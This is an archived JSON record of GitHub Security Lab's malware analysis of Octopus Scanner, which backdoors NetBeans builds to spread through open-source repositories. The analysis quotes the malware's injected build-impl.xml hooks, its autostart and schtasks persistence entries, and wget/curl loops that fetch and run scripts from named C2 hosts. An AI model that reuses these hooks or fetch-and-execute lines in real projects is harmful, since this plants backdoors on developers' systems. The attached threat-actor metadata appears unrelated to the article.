{
    "id": "1a56d43f-3b4e-4e9b-bce3-6c72d6765405",
    "created_at": "2023-01-12T15:05:21.127967Z",
    "updated_at": "2025-03-27T02:05:32.818125Z",
    "deleted_at": null,
    "sha1_hash": "9cd982ea9ad3708c58768f5f6e82d22ad89a9cc5",
    "title": "2020-05-28 - The Octopus Scanner Malware- Attacking the open source supply chain",
    "authors": "",
    "file_creation_date": "2022-05-28T16:46:59Z",
    "file_modification_date": "2022-05-28T16:46:59Z",
    "file_size": 1227432,
    "plain_text": "# The Octopus Scanner Malware: Attacking the open source supply chain\n\n**[securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain)**\n\npwntester May 28, 2020\n\nMay 28, 2020\n\n[Alvaro Munoz](https://github.com/pwntester)\n\nSecuring the open source supply chain is an enormous task. It goes far beyond a security assessment or just patching\nfor the latest CVEs. Supply chain security is about the integrity of the entire software development and delivery\necosystem. From the code commits themselves, to how they flow through the CI/CD pipeline, to the actual delivery of\nreleases, there’s the potential for loss of integrity and security concerns, throughout the entire lifecycle.\n\nIn the past few years the open source supply chain experienced a variety of attacks. From developer credential hijacks\n[aimed at introducing backdoors, like in the event stream incident, to a seemingly nonstop stream of typosquatting](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)\n[attacks against popular package managers such as npm and](https://blog.scottlogic.com/2018/02/27/hunting-typosquatters-on-npm.html) [pypi.](https://nakedsecurity.sophos.com/2017/09/19/pypi-python-repository-hit-by-typosquatting-sneak-attack/)\n\n[Sometimes something as innocent as a misinterpreted warning can make a developer comment out a single line to](https://lists.debian.org/debian-security-announce/2008/msg00152.html)\ndramatic effect. The line between backdoor and typo can often be hard to differentiate, and often the circumstances of\nthe commit, not the commit itself, are the only clear indication of intent.\n\n[More blatantly, the build pipelines themselves may also be actively compromised, like in the Webmin incident. Other](https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html)\nhistorical examples include making backdoored toolchains available for download that then introduce backdoors in\n[compiled code like in the infamous malicious XCode incident.](https://www.macrumors.com/2015/09/20/xcodeghost-chinese-malware-faq/)\n\n**On March 9, we received a message from a security researcher informing us about a set of GitHub-hosted**\n**repositories that were, presumably unintentionally, actively serving malware. After a deep-dive analysis of the**\nmalware itself, we uncovered something that we had not seen before on our platform: malware designed to enumerate\nand backdoor `NetBeans projects, and which uses the build process and its resulting artifacts to spread itself.`\n\nIn the course of our investigation we uncovered 26 open source projects that were backdoored by this malware and\nthat were actively serving backdoored code.\n\n\n-----\n\nThis is the story of Octopus Scanner: An OSS supply chain malware.\n\n## Octopus Scanner\n\n[GitHub’s Security Incident Response Team (SIRT) received its initial notification about a set of repositories serving](https://github.com/security/incident-response)\n[malware-infected open source projects from security researcher JJ.](https://twitter.com/dfir_it)\n\nSIRT routinely receives and triages reports of bad actors abusing GitHub repositories to actively host malware or\nattempting to use the GitHub platform as part of a command and control (C2) infrastructure. But this report was\ndifferent. The owners of the repositories were completely unaware that they were committing backdoored code into\ntheir repositories.\n\nJJ provided a great level of detail about which repositories were vulnerable as well as a high-level description of what\nthe malware, dubbed “Octopus Scanner,” was actually doing. They noted:\n\nThe malware is capable of identifying the NetBeans project files and embedding malicious payload both in project\nfiles and build JAR files. Below is a high -evel description of the Octopus Scanner operation:\n\nIdentify user’s NetBeans directory\nEnumerate all projects in the NetBeans directory\nCopy malicious payload `cache.dat to` `nbproject/cache.dat`\nModify the `nbproject/build-impl.xml file to make sure the malicious payload is executed every time`\nNetBeans project is build\nIf the malicious payload is an instance of the Octopus Scanner itself the newly built JAR file is also infected.\n\n**Even though the malware C2 servers didn’t seem to be active at the time of analysis, the affected repositories**\n**still posed a risk to GitHub users that could potentially clone and build these projects. Unlike other GitHub**\nplatform abuse cases, the repository owners were most likely completely unaware of the malicious activity, and\ntherefore swiftly blocking or banning the maintainers was not an option for SIRT. GitHub Security Lab conducted an\ninvestigation of the malware to figure out how it was spreading and, more importantly, how to properly remove it from\ninfected repositories, without having to shut down user accounts.\n\n## Infection details\n\nAs described by JJ, once a user was infected by the Octopus Scanner, it went on to search for indications that the\nNetBeans IDE was in use on the developer system. If that wasn’t the case, it wouldn’t take any further actions.\nHowever, if it was found, the malware would proceed to backdoor NetBeans project builds through the following\nmechanisms:\n\n1. It makes sure that every time a project was built, any resulting JAR files got infected with a so-called dropper. A\n\ndropper is a mechanism that “drops” something to the filesystem to execute. When executed, the dropper\npayload ensured local system persistence and would subsequently spawn a Remote Administration Tool (RAT),\nwhich connects to a set of C2 servers.\n\n2. It tries to prevent any NEW project builds from replacing the infected one, to ensure that its malicious build\n\nartifacts remained in place.\n\nWe initially planned to get in contact with the owners of the infected repositories, send them a pull request to delete\n```\nnbproject/cache.dat, and clean up their nbproject/build-impl.xml files. The expectation was that this might\n\n```\nbe enough to clean out the repositories. While this wouldn’t resolve any local infections that affected the developers, it\nwould halt the active spread through the GitHub platform as the developers addressed their local platform security.\n\nHowever, a deeper analysis of this malware proved us wrong. These simple steps wouldn’t be sufficient since the\nmalware also infected any JAR files that were available in the project, such as dependencies—not necessarily just\nbuild artifacts.\n\n\n-----\n\nEven though we could only access one sample of Octopus Scanner (the build infecter), when reviewing infected\nrepositories, we found four different versions of infected NetBeans projects and all but one of them, a downstream\nsystem (for example, someone who cloned an infected project), would get infected by either building from an infected\nrepository or using any of the tainted artifacts that resulted from an infected build. The other variant would perform a\nlocal system infection but leave build artifacts untouched.\n\n## Technical analysis\n\nWe started our analysis with a sample of the `Octopus Scanner malware, without taking into account any initial`\ninfection vectors. As we can see in the VirusTotal dashboard, this malware has a low detection rate of 4 out of 60, so it\ncould easily go unnoticed.\n\nVirusTotal:\nhttps://www.virustotal.com/gui/file/be8d29f95a9626e2476a74f895743f54451014aab62840770e4f9704980b0ac6/details\n\nVT Detection Rate: 4/60\n\nVT First Submission: 2019-02-02 03:51:36\n\nVT Latest Contents Modification: 2019-01-27 16:19:40\n\nThe following diagram shows the different parts of the malware:\n\n\n-----\n\nThe malware disguises itself as an `ocs.txt file, but we can easily determine is is actually a Java Archive (JAR) file:`\n\n➜ nbproject_malware/samples master ✗ file ocs.txt\n```\nocs.txt.jar: Zip archive data, at least v1.0 to extract\n\n```\n➜ nbproject_malware/samples master ✗ binwalk ocs.txt\n```\nDECIMAL    HEXADECIMAL   DESCRIPTION\n-------------------------------------------------------------------------------0       0x0       Zip archive data, at least v1.0 to extract, compressed size: 100, uncompressed\nsize: 108, name: META-INF/MANIFEST.MF\n150      0x96      Zip archive data, at least v1.0 to extract, compressed size: 1614, uncompressed\nsize: 2889, name: octopussetup/OctopusSetup.class\n1825     0x721      Zip archive data, at least v1.0 to extract, compressed size: 251377,\nuncompressed size: 263305, name: resources/octopus.dat\n253463    0x3DE17     End of Zip archive, footer length: 22\n\n```\nThe JAR Manifest for the first stage dropper shows us that the `octopussetup.OctopusSetup.main() method runs`\non entry. Then, this method drops the second stage payload to the victim system.\n\nOn UNIX-like systems the first stage dropper will perform the following steps:\n\nextract the second stage payload `octopus.dat to` `$HOME/.local/share/octo`\ncreate `$HOME/.config/autostart/octo.desktop with the following contents:`\n```\n   #!/usr/bin/env xdg-open\n   [Desktop Entry]\n   Type=Application\n   Name=AutoUpdates\n   Exec=/bin/sh -c \"java -jar $HOME/.local/share/octo\"\n\n```\nThis auto starts the second stage payload for any desktop session for that user. The malware uses the file system\nseparator to decide how to proceed. Note that it treats Linux and MacOS in the same way, but the infection only\nworks on Linux systems.\n\nOn Windows systems, it:\n\nExtracts the second stage payload `octopus.dat to` `$TEMP/../Microsoft/Cache134.dat`\nRuns `schtasks /create /tn LogsProvider /tr javaw -jar $TEMP/../Microsoft/Cache134.dat /sc`\n```\n   MINUTE /f to schedule a task\n\n```\nRuns `schtasks /run /tn LogsProvider to actually spawn the scheduled task`\n\nThe most interesting part of the malware exists in this second stage payload `octopus.dat which, as we can infer`\nfrom the way it gets executed, is just another Java Jar file.\n\n\n-----\n\n### Infecting the NetBeans build\n\nThe `octopus.dat payload is the binary that actually performs the NetBeans build infections.`\n\nVirusTotal:\nhttps://www.virustotal.com/gui/file/48bd318d828ac2541c9495d1864ac1fa3bb12806fb1796aa58b94a69b9a7066d/detection\n\nVT Detection Rate: 2/61\n\nVT First Submission: 2019-02-02 08:16:25\n\nVT Latest Contents Modification: 2019-01-27 16:18:54\n\nThe sample we are analyzing belongs to version 3.2.01 of this malware. The versioning scheme is an indication that\nthis malware was developed in a structured way. When we take a closer look we can see that it will run the\n```\noctopus.OctopusScanner.main() method, which will perform the following actions:\n\n```\n1. Scan `$APPDATA/NetBeans or` `$HOME/.netbeans for`\n```\n   config/Preferences/org/netbeans/modules/projectui.properties files. These files contain information\n\n```\nabout any NetBeans projects available in the system.\n\n2. Search `projectui.properties for` `openProjectsURLs.XXX entries. These entries represent NetBeans`\n\nprojects by their `file:// URIs.`\n\n3. Infect each NetBeans project. For each project found, the malware will infect it by:\n\ndropping an innocent-looking file called `cache.dat into` `<PROJECT>/nbproject/`\nmodifying `<PROJECT>/nbproject/build-impl.xml in such a way that` `cache.dat will get executed as`\npart of the build process itself.\n\nA NetBeans project build consists of multiple steps but the Octopus Scanner malware is only interested in the `pre-`\n```\njar and post-jar tasks. The pre-jar tasks provide hooks into the build at the point where all Java classes are\n\n```\ncompiled but before they are zipped into a final JAR artifact. The post-jar tasks provide hooks into the build at the point\nthe JAR has actually been created.\n\nIn order to access these build hooks, the malware will search for the following entries:\n```\n  <target name=\"-pre-jar\">\n    <!-- Empty placeholder for easier customization. -->\n    <!-- You can override this target in the ../build.xml file. -->\n  </target>\n  ...\n  <target name=\"-post-jar\">\n    <!-- Empty placeholder for easier customization. -->\n    <!-- You can override this target in the ../build.xml file. -->\n  </target>\n\n```\nFor the pre-jar hooks it will inject a `<java> subtask that will execute` `cache.dat (the infecter) for every class added`\nto the JAR file:\n```\n<target name=\"-pre-jar\">\n  <!-- Empty placeholder for easier customization. -->\n  <!-- You can override this target in the ../build.xml file. -->\n  <java jar=\"nbproject/cache.dat\" failonerror=\"false\">\n    <arg value=\"-pre-jar\"/>\n    <arg value=\"${build.classes.dir}\"/>\n  </java>\n</target>\n\n```\nFor the post-jar hooks it will also run `cache.dat but with a different set of arguments.`\n\n\n-----\n\n```\n  g p j\n  <!-- Empty placeholder for easier customization. -->\n  <!-- You can override this target in the ../build.xml file. -->\n  <java jar=\"nbproject/cache.dat\" failonerror=\"false\">\n    <arg value=\"-post-jar\"/>\n    <arg value=\"${build.classes.dir}\"/>\n  </java>\n</target>\ncache.dat is responsible for backdooring the built classes so that when these classes get executed, they will infect\n\n```\nthe underlying system. We will go into more detail about this in a bit.\n\nAs previously mentioned, during the analysis we found that `Octopus Scanner will not stop there. It also scans the`\n```\n<PROJECT> directory for any JAR files and backdoors those in a way that is similar to how cache.dat infects built\n\n```\nclasses. This last step makes it difficult to automatically clean infected repositories. We cannot just delete those JAR\nfiles since they are most likely required dependencies for the project.\n\n### Infecting the system\n\nAt this point in the infection chain, the malware was able to infect both the build artifacts as well as any project\ndependencies, but it did not drop any files to persist in the underlying system yet.\n\nThe actual system infection process will be carried out by `cache.dat . As with biologic viruses, most malware`\nattempts to spread as broadly as possible. Infecting systems that were already infected would be moot. Infecting build\nartifacts is a means to infect more hosts since the infected project will most likely get built by other systems and the\nbuild artifacts will probably be loaded and executed on other systems as well.\n\nAs we all know, life always finds a way—even virulent digital life.\n\nSince our malware sample uses a hardcoded name for the first stage dropper ( cache.dat ) and because it is always\nplaced in a static location ( <PROJECT>/nbproject ), we were able to query GitHub repositories for any infected\nprojects for the known variants of the malware. By doing so we were able to harvest four different samples of this\nmalware:\n```\n-rw-r--r-- 1 pwntester staff 14203 Apr 30 12:52 cache.dat_18107f2a3e8c7c03cc4d7ada8ed29401\n-rw-r--r-- 1 pwntester staff 142513 Apr 30 12:52 cache.dat_aea4ce82d4207d2e137a685a7379f730\n-rw-r--r-- 1 pwntester staff 139898 Apr 30 12:52 cache.dat_bcb745a7dae7c5f85d07b7e9c19d030a\n-rw-r--r-- 1 pwntester staff 139898 Apr 30 12:52 cache.dat_dc2e53334b6f20192e2c90c2c628e07a\n\n```\nNote that the first sample has a completely different size. It’s safe to assume that this sample will stand out from the\ncrowd and the other samples will only have minor differences between them.\n\nLet’s verify that with further analysis of our sample set.\n\n**18107f2a3e8c7c03cc4d7ada8ed29401**\n\nVirusTotal:\nhttps://www.virustotal.com/gui/file/13e1f2716a0827b3f8933069319e08d07ea2b949141151a639dd2aef10d81985/detection\n\nVT Detection Rate: 1/61\n\nVT First submission: 2018-08-26 12:48:34\n\nVT Earliest Contents Modification: 2018-03-30 23:34:58\n\nThis was probably one of the earliest, if not the first, version of the malware since this version does not infect the\nclasses in the JAR file being built. Instead, it infects the system directly. Therefore this version will only spread through\ntainted repository cloning and building, while the other samples will also spread when any of the resulting build artifacts\nare loaded and used. Therefore, for this particular version, the malware was not backdooring the build classes and the\ndiagram is slightly different:\n\n\n-----\n\nOn UNIX-like systems it will drop the following files:\n\n1. `$HOME/Library/LaunchAgents/AutoUpdater.dat This is Java Jar file which runs the` `fen.Main.main()`\n\nmethod which in turn downloads and installs a RAT-like tool from `http://ecc.freeddns.org/data.txt and`\n```\n   http://san.strangled.net/stat . The downloaded RAT is an instance of FEimea Portable App - ver.\n   3.11.2 which was analyzed by JJ in this blog post\n\n```\n2. `$HOME/.local/share/bbauto This is the same as` `AutoUpdater.dat`\n\n3. `$HOME/Library/LaunchAgents/AutoUpdater.plist This auto-launcher runs the` `AutoUpdater.dat dropper`\n\nby running `java -jar \"$HOME/Library/LaunchAgents/AutoUpdater.dat`\n\n4. `$HOME/.config/autostart/none.desktop This auto-launcher launches the` `bbauto dropper by running`\n```\n   /bin/sh -c \"java -jar $HOME/.local/share/bbauto\"\n\n```\n5. `$HOME/.config/autostart/.desktop This file will run` `/bin/sh -c 'while true;do wget`\n```\n   http://eln.duckdns.org/se -O -|sh;sleep 60;done' which will basically run a script provided by the C2\n\n```\n6. `$HOME/Library/LaunchAgents/SoftwareSync.plist Similar to the step above, it runs` `while true;do curl`\n\n```\nhttp://eln.duckdns.org/se -o -|sh;sleep 60;done\n\n```\n\nNote the explicit support for MacOS specific launch paths as well as XDG’s .config mechanism which is popular on\nmany Linux distributions.\n\nOn a Windows system it will drop the RAT dropper into `%TEMP%\\..\\Microsoft\\ExplorerSync.db (same as`\n```\nAutoUpdater.dat on UNIX systems) and then use Java reflection to run the dropper via schtasks /create /tn\nExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f\n\n```\n**aea4ce82d4207d2e137a685a7379f730**\n\nVirusTotal:\nhttps://www.virustotal.com/gui/file/a7d664bff764bfc2cc6b13c15b2d7d7f09d0e55f0c376a81b64644d85ebe1e0b/detection\n\nVT Detection Rate: 16/60\n\nVT First submission: 2018-05-20 22:22:28\n\nVT Earliest Contents Modification: 2018-04-13 13:10:58\n\nThis version of the malware executes in two stages of the NetBeans build: `pre-jar and` `post-jar :`\n\nThe `-pre-jar task is responsible for infecting the classes that are about to be jarred. This infection will essentially`\nreplicate itself as a hidden dropper in these classes so that when they are executed, they will infect the system by\ndropping the same files which were dropped directly by the `18107f2a3e8c7c03cc4d7ada8ed29401 sample.`\n\n\n-----\n\nThe `post jar task will then create two empty files,` `.netbeans_automatic_build and`\n```\n.netbeans_update_resources . These files are markers denoting that the contents of the build are in an up-to-date\n\n```\nstate. This bypasses the compile-on-save mechanism to prevent project rebuilds.\n\n**bcb745a7dae7c5f85d07b7e9c19d030a**\n\nVirusTotal:\nhttps://www.virustotal.com/gui/file/5d49b3a1906167c31a2fb41b6ce65c030a8b5a84c33401bbac4b718b015c9db7/details\n\nVT Detection Rate: 13/60\n\nVT First submission: 2020-03-08 17:58:04\n\nVT Earliest Contents Modification: 2018-09-23 12:51:02\n\nThis version is probably an earlier version of aea4ce82d4207d2e137a685a7379f730. The main difference is in the\nname of the dropped files:\n```\n   $HOME/Library/LaunchAgents/Main.class instead of $HOME/Library/LaunchAgents/AutoUpdater.dat\n   $HOME/.local/share/Main.class instead of $HOME/.local/share/bbauto\n\n```\n**dc2e53334b6f20192e2c90c2c628e07a**\n\nVirusTotal:\nhttps://www.virustotal.com/gui/file/01e28d963036b05a26773c2679cfe7b04ffd6dd56506630e7e19a29a2d1e6aee/detection\n\nVT Detection Rate: 5/61\n\nVT First submission: 2019-02-02 12:41:48\n\nVT Earliest Contents Modification: 2019-01-27 16:18:46\n\nThis version is practically identical to bcb745a7dae7c5f85d07b7e9c19d030a and likely a minor release to reduce hashbased detection. By making minor changes in the build artifacts of a malware, the authors can throw off the hash-based\ndetection that many AV engines and EDR solutions rely on.\n\n### Deobfuscating the malware\n\nRunning the `strings command on` `cache.dat or the backdoored classes will not render any interesting analysis`\nbecause our malware samples actively obfuscate their code to make this harder.\n\nMore specifically, the droppers in our sample set combine three different data blobs, of up to 1024 bytes each, into a\nsingle-encrypted data blob by chaining methods such as:\n```\npublic static void a447410325() throws Exception {\n  Class var0 = Class.forName(Thread.currentThread().getStackTrace()[1].getClassName())\n  System.arraycopy(new byte[]{-81, 51, -95, -91, ..., -88, -16, 89, 33}, 0,\n(byte[])var0.getField(\"a\").get((Object)null), 1024, 1024); \n  var0.getMethod(\"a1009916519\").invoke((Object)null);\n}\n\n```\nAfter the blob’s reconstruction, it decrypts the encrypted blob with the following routine:\n\n\n-----\n\n```\np () p {\n  Class var0 = Class.forName(Thread.currentThread().getStackTrace()[1].getClassName());\n  ...\n  byte[] var3 = (byte[])Class.forName(Thread.currentThread().getStackTrace()\n[1].getClassName()).getField(\"a\").get((Object)null);\n  int var1 = 0;\n  for(int var2 = 3201; var1 < 3008; var1 += 3) {\n    var2 = var2 % 17 - 233 + var2 % 236;\n    var3[var1 + 1] = (byte)(var3[var1 + 1] - (~var3[var1] + var2 - (18 - var2)));\n    var3[var1 + 2] = (byte)(var3[var1 + 2] - (var3[var1 + 1] - (~var2 & 23) - 133));\n    var3[var1] = (byte)(var3[var1] + -var3[var1 + 1] % 51 + (~var3[var1 + 2] | 134));\n    var3[var1] = (byte)(var3[var1] ^ var3[var1 + 2] - 30 + var2 % 3);\n    var3[var1] = (byte)(var3[var1] - ((var3[var1 + 1] & var3[var1 + 2]) - (var3[var1 + 2] - 1)));\n  }\n}\n\n```\nBeing able to access this decrypted data will give us a good idea of what the malware is actually doing. In order to get\nto this data right after it gets decrypted, we used a Java instrumentation agent that modifies the Bytecode of the class\nresponsible for decrypting the blob ( b.b ) right before it actually gets loaded into the JVM.\n\n[We can do this by writing a ClassFileTransformer and then using a Bytecode manipulation library such as Javassist or](https://docs.oracle.com/javase/9/docs/api/java/lang/instrument/ClassFileTransformer.html)\n[ByteBuddy to inject our analysis code:](https://github.com/raphw/byte-buddy)\n```\nClassPool cp = ClassPool.getDefault();\n// Get b.b class\nCtClass cc = cp.get(\"b.b\");\n// Get decryption method\nCtMethod m = cc.getDeclaredMethod(\"a1009916519\");\n// Inject code to dump `this.a`\nString endBlock = \"org.apache.commons.io.FileUtils.writeByteArrayToFile(new\njava.io.File(\\\"/tmp/memory_dump\\\"), (byte[]) Class.forName(Thread.currentThread().getStackTrace()\n[1].getClassName()).getField(\\\"a\\\").get(null));\";\nm.insertAfter(endBlock);\nbyteCode = cc.toBytecode();\ncc.detach();\n\n```\nBy inspecting the `/tmp/memory_dump file we obtain a much clearer understanding of what the malware is doing:`\n\n\n-----\n\nAnother useful transformation for analysis involves modifying the `java.io.FileOutputStream constructor to capture`\nthe names of the files the dropper in question is writing to:\n```\nif (finalTargetClassName.equals(\"java/io/FileOutputStream\")) {\n  System.out.println(\"[IN] \" + className);\n  try {\n    ClassPool cp = ClassPool.getDefault();\n    CtClass cc = cp.get(targetClassName);\n    CtConstructor[] ctors = cc.getDeclaredConstructors();\n    for (CtConstructor ctor : ctors) {\n      ctor.insertBefore(\"System.out.println(java.lang.String.valueOf($args[0]));\");\n    }\n    byteCode = cc.toBytecode();\n    cc.detach();\n    System.out.println(\"[Agent] Class successfully modified\");\n  } catch (Exception e) {\n    System.out.println(e.getMessage());\n    e.printStackTrace();\n  }\n}\n\n```\nThis provides us with a good understanding of which files the malware is initially trying to access.\n```\npwntester@pwnlab:~/workspace/octopus-analysis/java_agent$ java -javaagent:Dumper-1.0-SNAPSHOT-jar-withdependencies.jar -cp .:/ Test\nRegistering transformer for java.io.FileOutputStream\n[Agent] Transforming class java/io/FileOutputStream\n[IN] java/io/FileOutputStream\n[Agent] Class successfully modified\nDumping: java/io/FileOutputStream\n/home/pwntester/.config/autostart/.desktop \n/home/pwntester/.config/autostart/none.desktop \n/home/pwntester/.local/share/Main.class \n/home/pwntester/Library/LaunchAgents/SoftwareSync.plist \n/home/pwntester/Library/LaunchAgents/AutoUpdater.plist \n/home/pwntester/Library/LaunchAgents/Main.class \n\n## Conclusions\n\n```\nWhile we have seen many cases where the software supply chain was compromised by hijacking developer credentials\nor typosquatting popular package names, a malware that abuses the build process and its resulting artifacts to spread\nis both interesting and concerning for multiple reasons.\n\nIn an OSS context, it gives the malware an effective means of transmission since the affected projects will presumably\nget cloned, forked, and used on potentially many different systems. The actual artifacts of these builds may spread\neven further in a way that is disconnected from the original build process and harder to track down after the fact.\n\nSince the primary-infected users are developers, the access that is gained is of high interest to attackers since\ndevelopers generally have access to additional projects, production environments, database passwords, and other\ncritical assets. There is a huge potential for escalation of access, which is a core attacker objective in most cases.\n\nIt was interesting that this malware attacked the NetBeans build process specifically since it is not the most common\nJava IDE in use today. If malware developers took the time to implement this malware specifically for NetBeans, it\nmeans that it could either be a targeted attack, or they may already have implemented the malware for build systems\nsuch as Make, MsBuild, Gradle and others as well and it may be spreading unnoticed.\n\n[While infecting build processes is certainly not a new idea, seeing it actively deployed and used in the wild is certainly a](https://www.youtube.com/watch?v=-UU9fC0NDIA)\ndisturbing trend.\n\nAs such, GitHub is continuously thinking about ways we can improve the integrity and security of the OSS supply\n[chain. This includes features such to help detect issues in your dependencies, using Dependency Graph,](https://help.github.com/en/github/visualizing-repository-data-with-graphs/listing-the-packages-that-a-repository-depends-on) security\nalerts for vulnerable dependencies, and [automated security updates; and features to help detect potential issues in](https://help.github.com/en/github/managing-security-vulnerabilities/configuring-automated-security-updates)\n\n\n-----\n\n[your code, including code scanning and](https://help.github.com/en/github/finding-security-vulnerabilities-and-errors-in-your-code/about-code-scanning) [secret scanning. And of course, we maintain an active response channel and](https://help.github.com/en/github/administering-a-repository/about-secret-scanning)\nresearch capability through GitHub SIRT and GitHub Security Lab, as well as initiatives such as the Open Source\nSecurity Coalition.\n\nThanks to [JJ (@dfir_it),](https://twitter.com/dfir_it) [@anticomputer,](https://github.com/anticomputer) [@jayswan,](https://github.com/jayswan) [@nicowaisman, and](https://github.com/nicowaisman) [@swannysec for the contribution to this](https://github.com/swannysec)\nresearch and blog post.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-28 - The Octopus Scanner Malware- Attacking the open source supply chain.pdf"
    ],
    "report_names": [
        "2020-05-28 - The Octopus Scanner Malware- Attacking the open source supply chain.pdf"
    ],
    "threat_actors": [
        {
            "id": "6b9fc913-06c6-4432-8c58-86a3ac614564",
            "created_at": "2022-10-25T16:07:24.185236Z",
            "updated_at": "2025-03-27T02:02:10.135195Z",
            "deleted_at": null,
            "main_name": "SideWinder",
            "aliases": [
                "APT-C-17",
                "APT-Q-39",
                "BabyElephant",
                "GroupA21",
                "HN2",
                "Hardcore Nationalist",
                "Rattlesnake",
                "Razor Tiger",
                "SideWinder",
                "T-APT-04"
            ],
            "source_name": "ETDA:SideWinder",
            "tools": [
                "BroStealer",
                "Capriccio RAT",
                "callCam"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "173f1641-36e3-4bce-9834-c5372468b4f7",
            "created_at": "2022-10-25T15:50:23.349637Z",
            "updated_at": "2025-03-27T02:00:55.450857Z",
            "deleted_at": null,
            "main_name": "Sidewinder",
            "aliases": [
                "Sidewinder",
                "T-APT-04"
            ],
            "source_name": "MITRE:Sidewinder",
            "tools": [
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d0c0a5ea-3066-42a5-846c-b13527f64a3e",
            "created_at": "2023-01-06T13:46:39.080551Z",
            "updated_at": "2025-03-27T02:00:02.992026Z",
            "deleted_at": null,
            "main_name": "RAZOR TIGER",
            "aliases": [
                "SideWinder",
                "APT-C-17",
                "T-APT-04"
            ],
            "source_name": "MISPGALAXY:RAZOR TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535921,
    "ts_updated_at": 1743041132,
    "ts_creation_date": 1653756419,
    "ts_modification_date": 1653756419,
    "files": {
        "pdf": "https://archive.orkl.eu/9cd982ea9ad3708c58768f5f6e82d22ad89a9cc5.pdf",
        "text": "https://archive.orkl.eu/9cd982ea9ad3708c58768f5f6e82d22ad89a9cc5.txt",
        "img": "https://archive.orkl.eu/9cd982ea9ad3708c58768f5f6e82d22ad89a9cc5.jpg"
    }
}